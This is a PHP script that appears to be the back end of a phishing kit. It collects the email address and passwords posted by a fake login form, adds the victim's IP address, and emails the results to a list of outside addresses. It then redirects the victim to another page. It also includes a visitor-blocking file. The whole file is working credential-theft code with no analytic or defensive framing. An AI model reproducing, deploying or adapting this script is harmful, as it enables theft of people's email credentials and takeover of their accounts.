<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "Emailm---Passu--------\n";
$message .= "Email Addy: " .$_POST['1']."\n\n";
$message .= "Passw0: " .$_POST['2']."\n\n";
$message .= "Passw0 2: " .$_POST['3']."\n\n";
$message .= "Emailm---Passu--------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "Eddy--Email--passu--\n";
$recipient = "donflow2021@yahoo.com,ceocfo1988@aol.com,donflowmania@yahoo.com, user0202777a@gmail.com, jcole15000@hotmail.com, donflowmania@maine.rr.com";
$subject = "Email--Pass--Login-Results";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."Email";
$headers .= "Email-And-Password-Result";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: __++--^==.htm");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>